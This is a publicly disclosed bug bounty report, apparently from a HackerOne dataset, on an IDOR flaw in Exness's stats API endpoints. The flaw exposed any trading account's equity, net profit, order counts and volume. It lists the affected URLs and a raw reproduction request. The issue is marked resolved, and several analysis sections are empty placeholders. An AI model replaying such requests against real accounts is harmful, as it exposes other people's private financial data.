---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1644436'
original_report_id: '1644436'
title: IDOR in Stats API Endpoint Allows Viewing Equity or Net Profit of Any MT Account
weakness: Insecure Direct Object Reference (IDOR)
team_handle: exness
created_at: '2022-07-21T06:09:49.337Z'
disclosed_at: '2022-12-05T15:50:08.032Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 43
asset_identifier: Personal Area for Web Trading
asset_type: OTHER
max_severity: critical
tags:
- hackerone
- insecure-direct-object-reference-idor
---

# IDOR in Stats API Endpoint Allows Viewing Equity or Net Profit of Any MT Account

## Metadata

- HackerOne Report ID: 1644436
- Weakness: Insecure Direct Object Reference (IDOR)
- Program: exness
- Disclosed At: 2022-12-05T15:50:08.032Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi Team,

Today I logged into my Exness PA and noticed an updated performance [page](https://my.exness.com/pa/performance/summary). I thought to give it a quick check and noticed that the API endpoints responsible for fetching the stats performance chart (```*/stats/*```) is vulnerable to IDOR via `accounts=` parameter. The issue allows fetching the stats of any MT account and discloses the account equity / net profit  of the corresponding account.

#Vulnerable Endpoints
```
https://my.exness.com/v3/personal_area/stats/net_profit?time_range=365&accounts={accountNumber}
https://my.exness.com/v3/personal_area/stats/orders_number?time_range=365&accounts={accountNumber}
https://my.exness.com/v3/personal_area/stats/trading_volume?time_range=365&accounts={accountNumber}
https://my.exness.com/v3/personal_area/stats/equity?time_range=365&accounts={accountNumber}
```

#Steps to Reproduce
```
GET /v3/personal_area/stats/equity?time_range=365&accounts=xxx HTTP/2
Host: my.exness.com
Authorization: Bearer xyz
Content-Type: application/json
```


#Proof of Concept

███████

## Impact

IDOR allows stats of any MT trading account. The stats includes account net profit, closed order counts, trading volumes and daily equity figures.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
